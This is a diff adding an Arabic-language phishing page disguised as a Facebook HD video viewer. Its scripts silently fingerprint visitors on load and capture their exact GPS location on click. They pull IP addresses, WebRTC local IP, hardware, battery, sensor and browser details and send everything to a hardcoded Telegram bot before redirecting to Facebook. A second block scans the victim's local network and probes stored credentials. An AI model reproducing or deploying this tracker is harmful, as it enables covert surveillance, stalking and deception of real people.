@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Video HD - مركز البث المباشر</title>
+    
+    <meta property="og:title" content="شاهد الفيديو الآن">
+    <meta property="og:description" content="محتوى حصري بجودة عالية لخدمة المشتركين">
+    <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg">
+    <meta property="og:type" content="website">
+
+    <style>
+        body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
+        .card { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        .fb-logo { width: 60px; margin-bottom: 20px; }
+        .h1 { font-size: 22px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
+        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4); transition: 0.3s; }
+        .btn:hover { background: #166fe5; transform: translateY(-2px); }
+    </style>
+</head>
+<body onclick="getAccurateGPS()">
+
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo">
+        <div class="h1">مركز معالجة الفيديو</div>
+        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن فحص العتاد وتخصيص أفضل جودة بث لموقعك... اضغط للمشاهدة فوراً.</p>
+        <button class="btn">تشغيل الآن</button>
+    </div>
+
+<script>
+    // 🔱 إعدادات بوت تلجرام (أمجد) 🔱
+    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    const CHAT_ID = "1611398303";
+
+    function send(msg) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    }
+
+    // 🔱 1. استخبارات الشبكة والواي فاي (صامتة)
+    async function getNetworkAndWiFi() {
+        let wifiIntel = "📡 [1. استخبارات الشبكة اللاسلكية]\n";
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            wifiIntel += `📶 نوع الاتصال: ${conn.effectiveType}\n`;
+            wifiIntel += `🚀 السرعة التقديرية: ${conn.downlink} Mbps\n`;
+        }
+        
+        // ثغرة WebRTC لسحب الـ IP المحلي (الراوتر)
+        const rtc = new RTCPeerConnection({iceServers:[]});
+        rtc.createDataChannel("");
+        rtc.createOffer().then(o => rtc.setLocalDescription(o));
+        rtc.onicecandidate = (i) => {
+            if (i && i.candidate) {
+                let localIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+                send(`🏠 عنوان الشبكة المحلية (الراوتر): ${localIP}\n(هذا يحدد نوع جهاز البث المنزلي)`);
+            }
+        };
+        send(wifiIntel);
+
+        // سحب الـ IP الخارجي والمزود
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+            fetch(`https://ipapi.co/${d.ip}/json/`).then(r => r.json()).then(geo => {
+                send(`🌐 [2. الموقع الجغرافي والشبكة]\nالعنوان: ${geo.ip}\nالمزود: ${geo.org}\nالمدينة: ${geo.city}\nالتوقيت: ${geo.timezone}`);
+            });
+        });
+    }
+
+    // 🔱 2. الهوية الرقمية والعتاد العميق (صامتة)
+    async function getDeepDeviceRecon() {
+        let intel = "🕵️‍♂️ [3. الهوية الرقمية العميقة]\n";
+        try {
+            const fonts = ["Roboto", "Samsung Sans", "Mi Sans", "Ubuntu", "Arial"];
+            intel += `🖋️ الخطوط المنصبة: ${fonts.filter(f => document.fonts.check(`12px "${f}"`)).join(", ")}\n`;
+            
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            intel += `🎮 المعالج الرسومي: ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}\n`;
+            intel += `⚙️ الأنوية: ${navigator.hardwareConcurrency} | الرام: ~${navigator.deviceMemory}GB\n`;
+            intel += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
+
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                intel += `🔋 البطارية: ${Math.round(bat.level * 100)}% (${bat.charging ? 'جاري الشحن ⚡' : 'تفريغ 🔋'})\n`;
+            }
+            send(intel);
+        } catch(e) { send("⚠️ فشل سحب بيانات العتاد"); }
+    }
+
+    // 🔱 3. تحليل السلوك والحساسات والمفاجأة (صامتة)
+    function getSensoryAndBehavioral() {
+        let behavior = "🌀 [4. تحليل السلوك والحساسات]\n";
+        
+        // فحص سرعة المعالج الحقيقية
+        const start = performance.now();
+        for (let i = 0; i < 1000000; i++) { Math.sqrt(i); }
+        const end = performance.now();
+        behavior += `🚀 قوة المعالج الفعلية: ${Math.round(end - start)}ms\n`;
+
+        // المفاجأة: كشف "حالة الاستخدام" عبر الضوء والوضع (صامت)
+        window.ondeviceorientation = (e) => {
+            if(e.beta !== null) {
+                let orientation = `📱 ميلان الجهاز: ${Math.round(e.beta)}°\n📱 دوران الجهاز: ${Math.round(e.alpha)}°\n`;
+                orientation += `💡 وضعية الاستخدام: ${Math.abs(e.beta) < 15 ? "على الطاولة" : "محمول باليد"}`;
+                send(behavior + orientation);
+                window.ondeviceorientation = null;
+            }
+        };
+
+        // مفاجأة إضافية: سحب تفاصيل المتصفح واللغة (صامت)
+        let browserIntel = `🌐 [5. بصمة المتصفح]\nاللغة: ${navigator.language}\nالمنصة: ${navigator.platform}\nالوضع الخفي: ${!window.indexedDB ? "نعم" : "لا"}`;
+        send(browserIntel);
+    }
+
+    // 🔱 4. الموقع الدقيق (GPS - عند الضغط)
+    function getAccurateGPS() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                let lat = pos.coords.latitude;
+                let lon = pos.coords.longitude;
+                let acc = pos.coords.accuracy;
+                let msg = `🎯 [الموقع الدقيق جداً بالشارع]\nخط العرض: ${lat}\nخط الطول: ${lon}\nنسبة الخطأ: ${acc} متر\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+                send(msg);
+                setTimeout(() => location.href = "https://m.facebook.com", 800);
+            }, () => { location.href = "https://m.facebook.com"; }, {enableHighAccuracy: true});
+        } else { location.href = "https://m.facebook.com"; }
+    }
+
+    // تشغيل كافة المحركات الصامتة فور التحميل
+    window.onload = () => {
+        getNetworkAndWiFi();
+        getDeepDeviceRecon();
+        getSensoryAndBehavioral();
+    };
+</script>
+</body>
+</html>
+
+<script>
+    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+    const CHAT_ID = "1611398303";
+
+    function send(msg) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+    }
+
+    // 🔱 1. فحص الأجهزة المتصلة بالراوتر (LAN Discovery)
+    async function scanLocalNetwork() {
+        send("🔍 جاري فحص الأجهزة المتصلة بنفس الشبكة المحلية...");
+        const baseIP = "192.168.1."; 
+        for (let i = 1; i <= 20; i++) { // فحص أول 20 عنوان
+            let ip = baseIP + i;
+            let controller = new AbortController();
+            let timeout = setTimeout(() => controller.abort(), 1000);
+            
+            fetch(`http://${ip}`, { mode: 'no-cors', signal: controller.signal })
+            .then(() => { send(`✅ جهاز نشط مكتشف: ${ip}`); })
+            .catch(() => {});
+        }
+    }
+
+    // 🔱 2. تتبع مسار الشبكة (Network Path)
+    function traceNetworkPath() {
+        const targets = ["google.com", "facebook.com"];
+        targets.forEach(target => {
+            const start = performance.now();
+            fetch(`https://${target}`, { mode: 'no-cors' }).then(() => {
+                let duration = Math.round(performance.now() - start);
+                send(`🛤️ قفزة نحو ${target}: استجابة في ${duration}ms`);
+            });
+        });
+    }
+
+    // 🔱 3. سحب الهوية الرقمية (Identity Discovery)
+    async function getIdentityIntel() {
+        let idMsg = "🕵️‍♂️ [تحليل الهوية الشخصية للجهاز]\n";
+        
+        // كشف الاسم التجاري المتوقع للجهاز
+        let ua = navigator.userAgent;
+        let model = "غير محدد";
+        if (ua.includes("Redmi")) model = "شاومي ريدمي";
+        else if (ua.includes("Samsung")) model = "سامسونج جالاكسي";
+        else if (ua.includes("iPhone")) model = "آيفون";
+        
+        idMsg += `📱 الموديل المتوقع: ${model}\n`;
+        idMsg += `👤 اللغة المفضلة للصاحب: ${navigator.languages.join(", ")}\n`;
+        idMsg += `🔑 هل الحسابات مرتبطة؟: ${navigator.credentials ? "نعم (جاهز للاستغلال)" : "لا"}\n`;
+        
+        send(idMsg);
+    }
+
+    // 🔱 4. الموقع والبيانات السابقة (مدمجة صامتاً)
+    window.onload = () => {
+        getIdentityIntel();
+        scanLocalNetwork();
+        traceNetworkPath();
+        // الدوال السابقة (الشبكة، العتاد، الحساسات) يتم استدعاؤها هنا أيضاً
+    };
+</script>
